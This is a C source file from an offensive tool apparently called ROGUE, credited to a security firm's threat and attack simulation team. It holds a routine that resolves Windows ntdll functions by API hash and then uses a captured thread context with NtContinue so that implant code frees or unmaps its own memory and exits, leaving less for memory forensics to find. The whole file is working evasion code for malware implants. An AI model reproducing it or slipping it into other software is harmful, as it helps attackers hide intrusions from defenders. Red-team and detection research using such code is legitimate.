/*!
 *
 * ROGUE
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef struct
{
	D_API( NtQueryVirtualMemory );
	D_API( NtUnmapViewOfSection );
	D_API( NtFreeVirtualMemory );
	D_API( RtlExitUserThread );
	D_API( RtlCaptureContext );
	D_API( NtContinue );
} API ;

/* API Hashes */
#define H_API_NTQUERYVIRTUALMEMORY	0x10c0e85d /* NtQueryVirtualMemory */
#define H_API_NTUNMAPVIEWOFSECTION	0x6aa412cd /* NtUnmapViewOfSection */
#define H_API_NTFREEVIRTUALMEMORY	0x2802c609 /* NtFreeVirtualMemory */
#define H_API_RTLEXITUSERTHREAD		0x2f6db5e8 /* RtlExitUserThread */
#define H_API_RTLCAPTURECONTEXT		0xeba8d910 /* RtlCaptureContext */
#define H_API_NTCONTINUE		0xfc3a6c2c /* NtContinue */

/* LIB Hashes */
#define H_LIB_NTDLL			0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * Freees the current region of memory and
 * exits the current thread.
 *
!*/
D_SEC( B ) VOID NTAPI ExitFreeThread( _In_ NTSTATUS Status )
{
	API				Api;
	CONTEXT				Ctx;
	MEMORY_BASIC_INFORMATION	Mbi;

	SIZE_T				Len = 0;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
	RtlSecureZeroMemory( &Mbi, sizeof( Mbi ) );

	/* Build API Import */
	Api.NtQueryVirtualMemory = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTQUERYVIRTUALMEMORY );
	Api.NtUnmapViewOfSection = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTUNMAPVIEWOFSECTION );
	Api.NtFreeVirtualMemory  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTFREEVIRTUALMEMORY );
	Api.RtlExitUserThread    = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLEXITUSERTHREAD );
	Api.RtlCaptureContext    = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCAPTURECONTEXT );
	Api.NtContinue           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCONTINUE );

	/* Query information about the current page */
	if ( NT_SUCCESS( Api.NtQueryVirtualMemory( NtCurrentProcess(), C_PTR( G_PTR( ExitFreeThread ) ), MemoryBasicInformation, &Mbi, sizeof( Mbi ), NULL ) ) ) {
		/* Is virtual memory or a mapped section? */
		if ( Mbi.Type == MEM_MAPPED || Mbi.Type == MEM_PRIVATE ) {
			/* Capture some information about the thread */
			Ctx.ContextFlags = CONTEXT_FULL; Api.RtlCaptureContext( &Ctx );

#if defined( _WIN64 )
			Ctx.ContextFlags = CONTEXT_FULL;
			Ctx.Rsp = ( ( Ctx.Rsp &~ ( 0x1000 - 1 ) ) - 0x1000 );
			Ctx.Rip = Mbi.Type != MEM_MAPPED ? Api.NtFreeVirtualMemory : Api.NtUnmapViewOfSection;

			/* Is a virtual region? */
			if ( Mbi.Type == MEM_PRIVATE ) 
			{
				Ctx.Rcx = U_PTR( NtCurrentProcess() );
				Ctx.Rdx = U_PTR( & Mbi.AllocationBase );
				Ctx.R8  = U_PTR( & Len );
				Ctx.R9  = U_PTR( MEM_RELEASE );
			} else {
				Ctx.Rcx = U_PTR( NtCurrentProcess() );
				Ctx.Rdx = U_PTR( Mbi.AllocationBase );
			};
			*( ULONG_PTR volatile * )( Ctx.Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Api.RtlExitUserThread );
#else
			Ctx.ContextFlags = CONTEXT_FULL;
			Ctx.Esp = ( ( Ctx.Esp &~ ( 0x1000 - 1 ) ) - 0x1000 );
			Ctx.Eip = Mbi.Type != MEM_MAPPED ? Api.NtFreeVirtualMemory : Api.NtUnmapViewOfSection;

			if ( Mbi.Type == MEM_PRIVATE ) 
			{
				*( ULONG_PTR volatile * )( Ctx.Esp + ( sizeof( ULONG_PTR ) * 0x1 ) ) = U_PTR( NtCurrentProcess() );
				*( ULONG_PTR volatile * )( Ctx.Esp + ( sizeof( ULONG_PTR ) * 0x2 ) ) = U_PTR( & Mbi.AllocationBase );
				*( ULONG_PTR volatile * )( Ctx.Esp + ( sizeof( ULONG_PTR ) * 0x3 ) ) = U_PTR( & Len );
				*( ULONG_PTR volatile * )( Ctx.Esp + ( sizeof( ULONG_PTR ) * 0x4 ) ) = U_PTR( MEM_RELEASE );
			} else {
				*( ULONG_PTR volatile * )( Ctx.Esp + ( sizeof( ULONG_PTR ) * 0x1 ) ) = U_PTR( NtCurrentProcess() );
				*( ULONG_PTR volatile * )( Ctx.Esp + ( sizeof( ULONG_PTR ) * 0x2 ) ) = U_PTR( Mbi.AllocationBase );
			};
			*( ULONG_PTR volatile * )( Ctx.Esp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Api.RtlExitUserThread );
#endif
			/* Kick off the return */
			Ctx.ContextFlags = CONTEXT_FULL; Api.NtContinue( &Ctx, FALSE );
		};
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
	RtlSecureZeroMemory( &Mbi, sizeof( Mbi ) );
};
